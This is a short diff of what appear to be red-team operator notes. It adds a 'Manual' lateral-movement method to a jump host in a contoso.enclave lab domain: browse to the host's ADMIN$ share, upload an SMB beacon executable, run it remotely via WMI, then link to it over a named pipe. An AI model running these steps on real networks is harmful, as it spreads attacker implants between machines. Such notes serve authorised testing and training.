@@ -25,8 +25,18 @@ jump psexec64 enc-fs-1.contoso.enclave smb
 
 ---
 
+Manual
 ```powershell
-link smb 192.168.110.52 dotnet-diagnostic-1337
+cd \\enc-jmp-1.contoso.enclave\ADMIN$
+
+upload C:\Payloads\smb_x64.exe
+
+remote-exec wmi enc-jmp-1.contoso.enclave C:\Windows\smb_x64.exe
+```
+
+
+```powershell
+link smb enc-jmp-1.contoso.enclave W32TIME_ALT-1337
 ```
 
 ```powershell
